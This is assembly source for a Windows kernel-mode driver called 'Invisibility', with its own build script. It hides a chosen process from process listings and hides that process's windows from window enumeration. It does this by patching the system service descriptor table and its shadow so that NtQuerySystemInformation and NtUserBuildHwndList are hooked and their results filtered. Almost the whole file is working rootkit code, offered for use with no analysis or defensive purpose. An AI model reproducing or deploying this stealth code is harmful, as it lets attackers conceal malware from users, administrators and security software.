;@ECHO OFF
;GOTO MAKE

Comment %

-----------------------------------------------------------------------------------------
  Invisibility - Kernel Mode Driver
  ---------------------------------
  
  Purpose:
  
  - hook ntoskrnl!NtQuerySystemInformation and modify the API output to hide a
    specified process
  - hook win32k!NtUserBuildHwndList and modify the API output to hide the
    window handles, owned by the target process, to the caller
    
  by yoda

-----------------------------------------------------------------------------------------

%

.386
.MODEL FLAT, STDCALL
OPTION CASEMAP:NONE

INCLUDE     \masm32\include\windows.inc

INCLUDE     string.INC
INCLUDE     ntstruc.INC
INCLUDE     ntddk.INC
INCLUDE     ntoskrnl.INC
INCLUDE     NtDll.INC
INCLUDE     IoCtrl.INC
INCLUDELIB  \masm32\lib\wdm.lib
INCLUDELIB  \masm32\lib\ntoskrnl.lib
INCLUDELIB  \masm32\lib\ntdll.lib

;
; structure one can find at ntoskrnl!KeServiceDescriptorTable and at 'KeServiceDescriptorTableShadow'
;
SSDT STRUCT
	pSSAT              LPVOID  ?      ; System Service Address Table   ( LPVOID[] )
	Obsolete           DWORD   ?      ; or maybe: API ID base
	dwAPICount         DWORD   ?
	pSSPT              LPVOID  ?      ; System Service Parameter Table ( BYTE[] )
SSDT ENDS

;
; structure being built by the PUSHAD instruction on the stack
;
PUSHA_STRUCT STRUCT 1
	_EDI               DWORD ?
	_ESI               DWORD ?
	_EBP               DWORD ?
	_ESP               DWORD ?
	_EBX               DWORD ?
	_EDX               DWORD ?
	_ECX               DWORD ?
	_EAX               DWORD ?
PUSHA_STRUCT ENDS

;------------CONST-----------------------------------------------------------------------
.CONST
TEXTW szDevPath,           <\Device\INVISIBILITY/0>
TEXTW szSymPath,           <\DosDevices\INVISIBILITY/0>

;------------DATA------------------------------------------------------------------------
.DATA
pDevObj                     PDEVICE_OBJECT 0
pNQSI                       DD -1                                              ; ptr 2 ntdll!NtQuerySystemInformation
;pEW                         DD -1                                              ; ptr 2 user32!EnumWindows
dwTargetPID                 DD -1
dwNQSI_NT_ID                DD -1
pOldNtOsNQSI                DD  0
dwNUBHL_NT_ID               DD -1                                              ; ID of win32k!NtUserBuildHwndList
pOldWin32kNUBHL             DD  0
pKSDTS                      DD  0                                              ; filled in DriverEntry
pGetWindowThreadProcessId   DD -1

;------------CODE------------------------------------------------------------------------
.CODE
ASSUME FS : NOTHING

;
; Returns:   -1    = error
;            else  = Native API ID
;
; Args:      pApiEntry = EntryPoint address of a NTDLL routine
;
; Should look like....
; pApiEntry:
;            B8 XX XX XX XX        MOV     EAX, XXXXXXXX
;            8D 54 24 04           LEA     EDX, [ESP + 004h]
;            CD 2E                 INT     02Eh
;            C2 YY YY              RET     YYYY
;
NativeApiIdFromApiAddress PROC USES ESI EDI EBX, pApiEntry : LPVOID
	SUB     EAX, EAX
	DEC     EAX                                                            ; EAX -> -1 == error
	
	; signature check
	MOV     ESI, pApiEntry
	LODSB
	CMP     AL, 0B8h
	JNZ     @@exit
	LODSD
	LODSD
	CMP     EAX, 00424548Dh
	JNZ     @@exit
	LODSW
	CMP     AX, 02ECDh
	JNZ     @@exit
	LODSB
	CMP     AL, 0C2h
	JNZ     @@exit
	
	; grab NT API index
	MOV     EAX, pApiEntry
	MOV     EAX, [EAX + 1]
  @@exit:
	RET
NativeApiIdFromApiAddress ENDP

;
; Purpose:      Searches in memory for the so called KeServiceDesciptorTableShadow
;
; Return type:  void*; NULL == error
;
GetKeServiceDescriptorTableShadow PROC USES ESI EDI EBX
	; search for a ServiceDescriptorTable being equivalent to the one at KeService...
	MOV     ESI, _KeServiceDescriptorTable
	MOV     ESI, [ESI]                                                     ; ESI -> non-shadow SDT
	LEA     EDI, [ESI + 16]
	MOV     EBX, 0100h                                                     ; 0x100 * 16 bytes will be scanned
	XOR     EAX, EAX                                                       ; EAX == success indicator
  @@scan_loop:
  	PUSH    EDI
  	CALL    MmIsAddressValid
  	TEST    EAX, EAX
  	JZ      @F
  	PUSH    ESI
  	PUSH    EDI
  	MOV     ECX, 16
  	REPZ    CMPSB
  	POP     EDI
  	POP     ESI
  	JNZ     @F                                                             ; found the 2nd KSDT structure
  	
  	; found ? -> do additional tests
  	LEA     EAX, [EDI + 16]                                                ; EAX -> SDT 2 test
  	MOV     ECX, [EAX].SSDT.pSSAT
  	TEST    ECX, ECX
  	JNS     @F
  	MOV     ECX, [EAX].SSDT.Obsolete
  	TEST    ECX, ECX
  	JNZ     @F
  	MOV     ECX, [EAX].SSDT.dwAPICount
  	SHR     ECX, 16                                                        ; ECX == high word of struct.counter
  	JNZ     @F
  	MOV     ECX, [EAX].SSDT.pSSPT
  	TEST    ECX, ECX
  	JNS     @F
  	JMP     @@exit
  @@:	
  	; prepare 4 next location
  	ADD     EDI, 16
  	DEC     EBX                                                            ; decrease check counter
  	JNZ     @@scan_loop
  @@scan_end:
        XOR     EAX, EAX                                                       ; indicate: error
  @@exit:
	RET
GetKeServiceDescriptorTableShadow ENDP

;
; Purpose:      Wipe structure of our process from the information record chain returned by
;               NtQuerySystemInformation
;
; Return type:  void
;
HandleSystemProcessInfoOutput PROC pData
	MOV     ESI, pData                                                     ; ESI -> info blocks
	; loop through the SystemProcessInformation blocks and save the address
	; of our process block (-> EDI)
	SUB     EDI, EDI                                                       ; EDI will save ptr to our SPI
	SUB     EBX, EBX                                                       ; EBX will save ptr to block before our SPI
  HSPIO_loop:
  	CMP     DWORD PTR [ESI], 0                                             ; end of blocks reached ?
  	JZ      HSPIO_loop_end
  	MOV     EAX, [ESI].NT4_SYSTEM_PROCESS_INFORMATION.ProcessId
  	CMP     EAX, dwTargetPID
  	JNZ     @F
  	MOV     EDI, ESI                                                       ; we found our SPI block !
  	JMP     HSPIO_loop_end
  @@:
  	; next block
  	MOV     EBX, ESI
  	ADD     ESI, [ESI]                                                     ; ESI -> ptr to next block
  	JMP     HSPIO_loop  	
  HSPIO_loop_end:
	;  
  	; simply wipe the SPI block of our process by enlarging the upper block
  	;
  	TEST    EDI, EDI
  	JZ      @@exit
  	MOV     ECX, [EDI]                                                     ; ECX == size of target SPI
  	ADD     [EBX], ECX
  @@exit:
	RET
HandleSystemProcessInfoOutput ENDP

;
;NTSTATUS NTAPI
;NtQuerySystemInformation (SYSTEMINFOCLASS sic,
;                          PVOID           pData,
;                          DWORD           dSize,
;                          PDWORD          pdSize);
;
NtQuerySystemInformationHook:
;	INT     3
	PUSHFD
	PUSHA
	; get ptr to argument list
	LEA     EDI, [ESP + SIZEOF PUSHA_STRUCT + 4 + 4]                       ; EDI -> argument list
	; call the NT API
	PUSH    [EDI + 00Ch]                                                   ; push arguments
	PUSH    [EDI + 008h]                                                   ;
	PUSH    [EDI + 004h]                                                   ;
	PUSH    [EDI + 000h]                                                   ;
	PUSH    @F                                                             ; push RETurn address
	JMP     [pOldNtOsNQSI]
  @@:
	MOV     EDX, EAX                                                       ; EDX == call result
	; handle the call output
	SUB     EAX, EAX
	CMP     EDX, EAX                                                       ; STATUS_SUCCESS ?
	JNZ     @@NQSIH_test_done
	CMP     DWORD PTR [EDI], 5                                             ; our target query class ?
	JNZ     @@NQSIH_test_done

	PUSH    [EDI + 004h]
	CALL    HandleSystemProcessInfoOutput

  @@NQSIH_test_done:
        MOV     [ESP].PUSHA_STRUCT._EAX, EDX                                   ; save EDX 2 popad'ed EAX
	POPA
	POPFD
	
	RET     4 * 4

;
; Purpose:      Wipe the HWNDs form the HWND array being returned by NtUserBuildHwndList
;
; Return type:  void
;
HandleNtUserBuildHwndListHookOutput PROC pData
	LOCAL   dwPID      : DWORD
	
;	INT     3
	;
	; trace HWND chain
	;
	MOV     ESI, pData                                                     ; ESI -> HWND chain
  @@loop:
        MOV     EBX, [ESI]                                                     ; EBX == current HWND from chain

        ; We can call user32!GetWindowThreadProcessId from KernelMode ! It
        ; doesn't call any other APIs. It receives all information from the
        ; raw internal NT structures. -> *happiness*
        LEA     EAX, dwPID
        PUSH    EAX
        PUSH    EBX
        CALL    pGetWindowThreadProcessId
        TEST    EAX, EAX
        JZ      @@loop_end
        
        ; HWND from the process we want to hide ?
        MOV     EAX, dwPID
        CMP     EAX, dwTargetPID
        JNZ     @F
        MOV     DWORD PTR [ESI], 0FFFFh                                        ; corrupt the chain item rather than REP MOVSX
  @@:
        ; next chain entry
        LODSD
        SUB     ECX, ECX
        CMP     ECX, [ESI]                                                     ; end of HWND list ?? (DD 0x0)
        JZ      @@loop_end
        INC     ECX
        CMP     ECX, [ESI]                                                     ; end of HWND list ?? (DD 0x1)
        JZ      @@loop_end
        jmp     @@loop        
  @@loop_end:	
	RET
HandleNtUserBuildHwndListHookOutput ENDP

;
; NTSTATUS NTAPI
; NtUserBuildHwndList(                                                         ; my guesses
; 	IN  ARGUMENT_1,                                                        ; ...
;       IN  hParentHwnd,                                                       ; ..
;       IN  BOOL,
;       IN  ARGUMENT_4,
;       IN  SpaceForHandlesInBufferCount,
;       OUT pOutputBuffer,
;       OUT pbResult
; );
;
NtUserBuildHwndListHook:
;	INT     3

	; call the original NT API handler
	PUSH    [ESP + 4 + 4 * 6]                                              ; push org arg 7
	PUSH    [ESP + 4 + 4 * 6]                                              ; push org arg 6
	PUSH    [ESP + 4 + 4 * 6]                                              ; ...
	PUSH    [ESP + 4 + 4 * 6]
	PUSH    [ESP + 4 + 4 * 6]
	PUSH    [ESP + 4 + 4 * 6]				
	PUSH    [ESP + 4 + 4 * 6]	
	CALL    pOldWin32kNUBHL                                                ; call org API addr
	
	; we come into play - modify output
	PUSHFD
	PUSHA
	TEST    EAX, EAX                                                       ; did the call succeed ?
	JNZ     @@NUBHLH_mod_fini	
	LEA     ESI, [ESP + 4 + SIZEOF PUSHA_STRUCT + 4]                       ; ESI -> org arg list
	CMP     [ESI + 4 * 1], EAX                                             ; arg 2 == 0 when called from EnumWindows
	JNZ     @@NUBHLH_mod_fini
	CMP     [ESI + 4 * 2], EAX                                             ; arg 3 == 0 when called from EnumWindows
	JNZ     @@NUBHLH_mod_fini
	PUSH    [ESI + 4 * 5]                                                  ; push arg 6 - pOutputBuffer
	CALL    HandleNtUserBuildHwndListHookOutput	
  @@NUBHLH_mod_fini:
	POPA
	POPFD
	
	RET     4 * 7

;
; Purpose:      Hook the targets
;
; Return type:  void
;
EstablishHook PROC USES ESI EDI EBX
;	INT     3
	; test whether we've all needed information
	SUB     EAX, EAX
	DEC     EAX                                                            ; EAX == -1
	CMP     dwNQSI_NT_ID, EAX
	JZ      @@exit
	CMP     dwTargetPID, EAX
	JZ      @@exit
	CMP     dwNUBHL_NT_ID, EAX
	JZ      @@exit
	CMP     pGetWindowThreadProcessId, EAX
	
	; overwrite NQSI's API address in SSDT
	MOV     EAX, _KeServiceDescriptorTable
	MOV     EDI, [EAX]                                                     ; EDI -> ptr 2 SSDT
	MOV     EDX, dwNQSI_NT_ID                                              ; EDX == NQSI ID
	MOV     EBX, NtQuerySystemInformationHook
	MOV     EDI, [EDI].SSDT.pSSAT                                          ; EDI -> Native API addr chain
	XCHG    EBX, [EDI + 4 * EDX]
	MOV     pOldNtOsNQSI, EBX                                              ; save old handler	
	
	; over write NUBHL's API address in SSDT
	MOV     EAX, pKSDTS
	MOV     EDI, [EAX]                                                     ; EDI -> Native API addr chain
	MOV     EDX, dwNUBHL_NT_ID
	SUB     EDX, 01000h                                                    ; exclude 0x1000 flag from win32k ID
	MOV     EBX, NtUserBuildHwndListHook
	XCHG    EBX, [EDI + 4 * EDX]
	MOV     pOldWin32kNUBHL, EBX
	
  @@exit:
	RET
EstablishHook ENDP

;
; Purpose:      Unhook the locations
;
; Return type:  void
;
UnhookSystem PROC USES ESI EDI EBX
;	INT     3

	SUB     EAX, EAX
	CMP     pOldNtOsNQSI, EAX
	JZ      @@exit
	CMP     pOldWin32kNUBHL, EAX
	JZ      @@exit
	
	; rewrite NQSI API address in SSDT
	MOV     EAX, _KeServiceDescriptorTable
	MOV     EAX, [EAX]
	MOV     EAX, [EAX].SSDT.pSSAT
	MOV     EDX, dwNQSI_NT_ID
	MOV     EBX, pOldNtOsNQSI
	MOV     [EAX + EDX * 4], EBX
	
	; rewrite NUBHL API address in SSDT
	MOV     EAX, pKSDTS
	MOV     EAX, [EAX].SSDT.pSSAT
	MOV     EDX, dwNUBHL_NT_ID
	SUB     EDX, 01000h                                                    ; exclude 0x1000 flag from win32k ID
	MOV     EBX, pOldWin32kNUBHL
	MOV     [EAX + EDX * 4], EBX
	
  @@exit:
	RET
UnhookSystem ENDP


Comment %
;
; Return type: void*
;
GetMem PROC dwc : DWORD
	PUSH    dwc
	PUSH    PagedPool
	CALL    ExAllocatePool
	RET
GetMem ENDP

;
; Return type: void
;
FreeMem PROC p : LPVOID
	PUSH    p
	CALL    ExFreePool
	RET
FreeMem ENDP
%

;
; Purpose:   Handle device IO requests
;
DriverDispatch PROC USES ESI EDI EBX, pDriverObject, pIrp
	MOV     EDI, pIrp                                                       ; EDI -> IRP struct
	ASSUME  EDI : PTR _IRP
	SUB     EAX, EAX
	MOV     [EDI].IoStatus.Information, EAX
	MOV     [EDI].IoStatus.Status, EAX
	ASSUME  EDI : NOTHING
	
	MOV     ESI, (_IRP PTR [EDI]).PCurrentIrpStackLocation			; ESI -> IRP stack
	ASSUME  ESI : PTR IO_STACK_LOCATION
	.IF [ESI].MajorFunction == IRP_MJ_DEVICE_CONTROL
;		INT     3
		MOV     EAX, [ESI].DeviceIoControl.IoControlCode		; EAX = DeviceIoControl code	
		.IF EAX == IOC_PROVIDE1
			MOV     EAX, (_IRP PTR [EDI]).SystemBuffer              ; EAX -> in buffer
			PUSH    [EAX]
			PUSH    [EAX]
			POP     pNQSI
			CALL    NativeApiIdFromApiAddress
			MOV     dwNQSI_NT_ID, EAX
			
		.ELSEIF EAX == IOC_PROVIDE2
			MOV     EAX, (_IRP PTR [EDI]).SystemBuffer              ; EAX -> in buffer
			PUSH    [EAX]
			POP     dwTargetPID
			
		.ELSEIF EAX == IOC_PROVIDE3
			MOV     EAX, (_IRP PTR [EDI]).SystemBuffer              ; EAX -> in buffer
			;PUSH    [EAX]
			;POP     pEW
			MOV     EAX, [EAX]                                      ; EAX == EnumWindows ptr
			LEA     EAX, [EAX - 14]
			PUSH    EAX
			CALL    NativeApiIdFromApiAddress			
			MOV     dwNUBHL_NT_ID, EAX
			
		.ELSEIF EAX == IOC_PROVIDE4
			MOV     EAX, (_IRP PTR [EDI]).SystemBuffer
			PUSH    [EAX]
			POP     pGetWindowThreadProcessId			
			
		.ELSEIF EAX == IOC_HOOK
			CALL    EstablishHook
			
		.ELSEIF EAX == IOC_UNHOOK
			CALL    UnhookSystem
		.ENDIF
	.ENDIF
	ASSUME  ESI : NOTHING
	MOV     EDX, IO_NO_INCREMENT ; special calling 
	MOV     ECX, pIrp
	CALL    IoCompleteRequest
	MOV     EAX, STATUS_SUCCESS
	RET
DriverDispatch ENDP

DriverUnload PROC USES EBX ESI EDI, DriverObject
	LOCAL usSym : UNICODE_STRING
	
	; cleanup
	INVOKE  RtlInitUnicodeString, ADDR usSym, OFFSET szSymPath
	INVOKE  IoDeleteSymbolicLink, ADDR usSym
	INVOKE  IoDeleteDevice, pDevObj
	RET
DriverUnload ENDP

.CODE INIT
DriverEntry PROC USES EBX ESI EDI, DriverObject, RegPath
	LOCAL   usDev     : UNICODE_STRING
	LOCAL   usSym     : UNICODE_STRING
	
;	INT     3
	
	; create device/symbolic link
	INVOKE  RtlInitUnicodeString, ADDR usDev, OFFSET szDevPath
	INVOKE  IoCreateDevice, DriverObject, 0, ADDR usDev, FILE_DEVICE_NULL, 0, FALSE, OFFSET pDevObj
	OR      EAX, EAX
	JNZ     @@ExitProcErr
	INVOKE  RtlInitUnicodeString, ADDR usSym, OFFSET szSymPath
	INVOKE  IoCreateSymbolicLink, ADDR usSym, ADDR usDev 
	OR      EAX, EAX
	JNZ     @@ExitProcErr
	
	; setup DriverObject
	MOV     ESI, DriverObject
	ASSUME  ESI : PTR DRIVER_OBJECT
	MOV     [ESI].PDISPATCH_IRP_MJ_DEVICE_CONTROL, OFFSET DriverDispatch
	MOV     [ESI].PDISPATCH_IRP_MJ_CREATE, OFFSET DriverDispatch
	MOV     [ESI].PDRIVER_UNLOAD, OFFSET DriverUnload
	ASSUME  ESI : NOTHING
	
	; get/save the addr of GetKeServiceDescriptorTableShadow
	CALL    GetKeServiceDescriptorTableShadow
	MOV     pKSDTS, EAX
	
	MOV     EAX, STATUS_SUCCESS
@@ExitProc:
	RET
	
@@ExitProcErr:
	RET
DriverEntry ENDP
End DriverEntry

:MAKE
\MASM32\BIN\ML /c /coff /Gz /Cp /nologo InvisibilityKMD.BAT
\MASM32\BIN\LINK /nologo /DRIVER /BASE:0X10000 /ALIGN:32 /OUT:Invisibility.sys /SUBSYSTEM:NATIVE /IGNORE:4078 /OPTidata InvisibilityKMD.obj

MOVE Invisibility.sys ..

DEL *.OBJ

ECHO.
PAUSE
CLS